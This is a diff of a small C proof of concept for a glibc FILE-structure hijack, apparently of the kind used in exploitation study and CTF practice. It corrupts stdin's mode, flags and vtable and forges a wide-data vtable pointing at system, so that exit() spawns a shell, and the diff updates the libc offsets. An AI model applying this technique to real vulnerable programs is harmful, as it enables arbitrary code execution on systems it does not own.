@@ -3,8 +3,8 @@
 #include <stdint.h>
 int main()
 {
-    long libc_base = &printf - 0x60770;
-    long _IO_2_1_stdin_ptr = libc_base + 0x219aa0;
+    long libc_base = (long)(&printf) - 0x606f0;
+    long _IO_2_1_stdin_ptr = libc_base + 0x21b6a0;
 
     *(int*)(_IO_2_1_stdin_ptr + 0xc0) = 0;
      // fp->_mode = 0
@@ -16,7 +16,7 @@ int main()
     *(int*)(_IO_2_1_stdin_ptr + 0) =0x68732020;
     // fp->_flags = '  sh'
 
-    *(long*)(_IO_2_1_stdin_ptr + 0xd8) = libc_base + 0x2160c0;
+    *(long*)(_IO_2_1_stdin_ptr + 0xd8) = libc_base + 0x2170c0;
     // fp->_vtable = _IO_wfile_jumps
     
     // *(long*)(_IO_2_1_stdin_ptr + 0xa0) = wide_data;
@@ -25,9 +25,9 @@ int main()
     *(long*)(wide_data + 0x18) = 0;
     // fp->_wide_data->_IO_write_base = 0
 
-    long fake_wide_data_vtable = malloc(0x300);
+    long fake_wide_data_vtable = (long)malloc(0x300);
     *(long*)(wide_data + 0xe0) = fake_wide_data_vtable;
-    *(long*)(fake_wide_data_vtable + 0x68) = &system;
+    *((long*)(fake_wide_data_vtable + 0x68)) = (long)&system;
     // fp->_wide_data->_wide_vtable + 0x68 = &system
 
     exit(0);
